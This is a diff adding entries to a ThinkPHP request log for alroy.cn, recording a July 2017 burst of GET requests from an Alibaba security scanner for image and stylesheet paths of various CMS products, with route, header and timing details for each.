+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:42+08:00 ] 60.205.45.195 140.205.201.41 GET /Admin/Images/RectNoColor.gif
+[ log ] alroy.cn/Admin/Images/RectNoColor.gif [运行时间：0.026090s][吞吐率：38.33req/s] [内存消耗：1,839.77kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'Admin',
+    1 => 'Images',
+    2 => 'RectNoColor.gif',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:43+08:00 ] 60.205.45.195 140.205.201.41 GET /base/admin/images/linksup.gif
+[ log ] alroy.cn/base/admin/images/linksup.gif [运行时间：0.028653s][吞吐率：34.90req/s] [内存消耗：1,838.56kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'base',
+    1 => 'admin',
+    2 => 'images',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:43+08:00 ] 60.205.45.195 140.205.201.41 GET /base/templates/images/2.png
+[ log ] alroy.cn/base/templates/images/2.png [运行时间：0.028238s][吞吐率：35.41req/s] [内存消耗：1,838.53kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'base',
+    1 => 'templates',
+    2 => 'images',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:43+08:00 ] 60.205.45.195 140.205.201.41 GET /zb_users/AVATAR/0.png
+[ log ] alroy.cn/zb_users/AVATAR/0.png [运行时间：0.026973s][吞吐率：37.07req/s] [内存消耗：1,838.45kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'zb_users',
+    1 => 'AVATAR',
+    2 => '0.png',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:43+08:00 ] 60.205.45.195 140.205.201.41 GET /zb_users/avatar/0.png
+[ log ] alroy.cn/zb_users/avatar/0.png [运行时间：0.026380s][吞吐率：37.91req/s] [内存消耗：1,838.45kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'zb_users',
+    1 => 'avatar',
+    2 => '0.png',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:44+08:00 ] 60.205.45.195 140.205.201.41 GET /admin/skins/images/ads_set3.gif
+[ log ] alroy.cn/admin/skins/images/ads_set3.gif [运行时间：0.026124s][吞吐率：38.28req/s] [内存消耗：1,839.64kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'skins',
+    2 => 'images',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:44+08:00 ] 60.205.45.195 140.205.201.41 GET /images/forum_readme.gif
+[ log ] alroy.cn/images/forum_readme.gif [运行时间：0.027905s][吞吐率：35.84req/s] [内存消耗：1,838.58kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'images',
+    1 => 'forum_readme.gif',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:44+08:00 ] 60.205.45.195 140.205.201.41 GET /img/images/commentLoad.gif
+[ log ] alroy.cn/img/images/commentLoad.gif [运行时间：0.025560s][吞吐率：39.12req/s] [内存消耗：1,838.62kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'img',
+    1 => 'images',
+    2 => 'commentLoad.gif',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:45+08:00 ] 60.205.45.195 140.205.201.41 GET /install/images/bg-cmstop.jpg
+[ log ] alroy.cn/install/images/bg-cmstop.jpg [运行时间：0.026382s][吞吐率：37.90req/s] [内存消耗：1,838.55kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'install',
+    1 => 'images',
+    2 => 'bg-cmstop.jpg',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:45+08:00 ] 60.205.45.195 140.205.201.41 GET /app/Tpl/fanwe/images/icon_arrowdouble.jpg
+[ log ] alroy.cn/app/Tpl/fanwe/images/icon_arrowdouble.jpg [运行时间：0.027739s][吞吐率：36.05req/s] [内存消耗：1,839.29kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'app',
+    1 => 'Tpl',
+    2 => 'fanwe',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+  'images' => 'icon_arrowdouble.jpg',
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:45+08:00 ] 60.205.45.195 140.205.201.41 GET /admin/images/loadingAnimation.gif
+[ log ] alroy.cn/admin/images/loadingAnimation.gif [运行时间：0.025452s][吞吐率：39.29req/s] [内存消耗：1,839.59kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'images',
+    2 => 'loadingAnimation.gif',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:46+08:00 ] 60.205.45.195 140.205.201.41 GET /images/modmenu_li_hover_bg.gif
+[ log ] alroy.cn/images/modmenu_li_hover_bg.gif [运行时间：0.025606s][吞吐率：39.05req/s] [内存消耗：1,838.71kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'images',
+    1 => 'modmenu_li_hover_bg.gif',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:46+08:00 ] 60.205.45.195 140.205.201.41 GET /administrator/templates/system/images/calendar.png
+[ log ] alroy.cn/administrator/templates/system/images/calendar.png [运行时间：0.032319s][吞吐率：30.94req/s] [内存消耗：1,839.38kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'administrator',
+    1 => 'templates',
+    2 => 'system',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+  'images' => 'calendar.png',
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:46+08:00 ] 60.205.45.195 140.205.201.41 GET /images/banners/shop-ad-books.jpg
+[ log ] alroy.cn/images/banners/shop-ad-books.jpg [运行时间：0.024577s][吞吐率：40.69req/s] [内存消耗：1,838.79kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'images',
+    1 => 'banners',
+    2 => 'shop-ad-books.jpg',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:47+08:00 ] 60.205.45.195 140.205.201.41 GET /Images/Sort_Folder_Close.gif
+[ log ] alroy.cn/Images/Sort_Folder_Close.gif [运行时间：0.028381s][吞吐率：35.24req/s] [内存消耗：1,838.72kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'Images',
+    1 => 'Sort_Folder_Close.gif',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:47+08:00 ] 60.205.45.195 140.205.201.41 GET /Images/arrow_04.gif
+[ log ] alroy.cn/Images/arrow_04.gif [运行时间：0.027897s][吞吐率：35.85req/s] [内存消耗：1,838.40kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'Images',
+    1 => 'arrow_04.gif',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:47+08:00 ] 60.205.45.195 140.205.201.41 GET /e/install/images/bg_1.gif
+[ log ] alroy.cn/e/install/images/bg_1.gif [运行时间：0.025644s][吞吐率：39.00req/s] [内存消耗：1,838.48kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'e',
+    1 => 'install',
+    2 => 'images',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:47+08:00 ] 60.205.45.195 140.205.201.41 GET /images/public/hr_tijiao.gif
+[ log ] alroy.cn/images/public/hr_tijiao.gif [运行时间：0.027142s][吞吐率：36.84req/s] [内存消耗：1,838.76kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'images',
+    1 => 'public',
+    2 => 'hr_tijiao.gif',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:48+08:00 ] 60.205.45.195 140.205.201.41 GET /template/skin6/cn/images/ico_zlxz.gif
+[ log ] alroy.cn/template/skin6/cn/images/ico_zlxz.gif [运行时间：0.026563s][吞吐率：37.65req/s] [内存消耗：1,839.10kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'template',
+    1 => 'skin6',
+    2 => 'cn',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+  'images' => 'ico_zlxz.gif',
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:48+08:00 ] 60.205.45.195 140.205.201.41 GET /inc/image/bj.gif
+[ log ] alroy.cn/inc/image/bj.gif [运行时间：0.026663s][吞吐率：37.51req/s] [内存消耗：1,838.44kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'inc',
+    1 => 'image',
+    2 => 'bj.gif',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:48+08:00 ] 60.205.45.195 140.205.201.41 GET /install/style.css
+[ log ] alroy.cn/install/style.css [运行时间：0.029967s][吞吐率：33.37req/s] [内存消耗：1,838.56kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'install',
+    1 => 'style.css',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:49+08:00 ] 60.205.45.195 140.205.201.41 GET /admin/images/arrow_right_8x8.png
+[ log ] alroy.cn/admin/images/arrow_right_8x8.png [运行时间：0.026340s][吞吐率：37.97req/s] [内存消耗：1,839.62kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'images',
+    2 => 'arrow_right_8x8.png',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:49+08:00 ] 60.205.45.195 140.205.201.41 GET /static/common/topic-min-img.png
+[ log ] alroy.cn/static/common/topic-min-img.png [运行时间：0.025976s][吞吐率：38.50req/s] [内存消耗：1,838.55kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'static',
+    1 => 'common',
+    2 => 'topic-min-img.png',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:49+08:00 ] 60.205.45.195 140.205.201.41 GET /image/admin/add.gif
+[ log ] alroy.cn/image/admin/add.gif [运行时间：0.025909s][吞吐率：38.60req/s] [内存消耗：1,838.62kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'image',
+    1 => 'admin',
+    2 => 'add.gif',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:50+08:00 ] 60.205.45.195 140.205.201.41 GET /image/cflag/ad.gif
+[ log ] alroy.cn/image/cflag/ad.gif [运行时间：0.026804s][吞吐率：37.31req/s] [内存消耗：1,838.46kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'image',
+    1 => 'cflag',
+    2 => 'ad.gif',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:50+08:00 ] 60.205.45.195 140.205.201.41 GET /Admin/images/install_lines.jpg
+[ log ] alroy.cn/Admin/images/install_lines.jpg [运行时间：0.026567s][吞吐率：37.64req/s] [内存消耗：1,839.59kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'Admin',
+    1 => 'images',
+    2 => 'install_lines.jpg',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:50+08:00 ] 60.205.45.195 140.205.201.41 GET /Utility/pics/status-green.gif
+[ log ] alroy.cn/Utility/pics/status-green.gif [运行时间：0.025340s][吞吐率：39.46req/s] [内存消耗：1,838.68kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'Utility',
+    1 => 'pics',
+    2 => 'status-green.gif',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:50+08:00 ] 60.205.45.195 140.205.201.41 GET /images/i_3.jpg
+[ log ] alroy.cn/images/i_3.jpg [运行时间：0.026318s][吞吐率：38.00req/s] [内存消耗：1,838.72kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'images',
+    1 => 'i_3.jpg',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:51+08:00 ] 60.205.45.195 140.205.201.41 GET /product/waterimage/200x200.png
+[ log ] alroy.cn/product/waterimage/200x200.png [运行时间：0.027152s][吞吐率：36.83req/s] [内存消耗：1,838.55kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'product',
+    1 => 'waterimage',
+    2 => '200x200.png',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
